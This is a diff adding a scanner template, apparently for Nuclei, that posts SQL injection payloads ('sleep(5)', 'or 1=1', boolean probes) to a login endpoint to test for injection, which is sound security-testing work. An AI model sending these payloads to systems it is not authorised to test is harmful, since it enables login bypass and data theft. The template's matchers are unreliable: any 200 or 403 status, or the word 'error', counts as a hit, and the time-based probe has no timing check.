@@ -1,0 +1,30 @@
+id: sql-injection-error-messages
+info:
+  name: SQL Injection in Error Messages
+  severity: high
+  description: Test for SQL injection vulnerabilities in error messages
+  author: Your Name
+  reference: https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
+tags:
+  - sql
+  - injection
+  - error-messages
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+    body:
+      - "username=admin' and sleep(5)--"
+      - "username=' or 1=1#' and password='"
+      - "username=admin' and 1=1--"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 403
+      - type: word
+        words:
+          - "error"
+          - "warning"
+          - "exception"
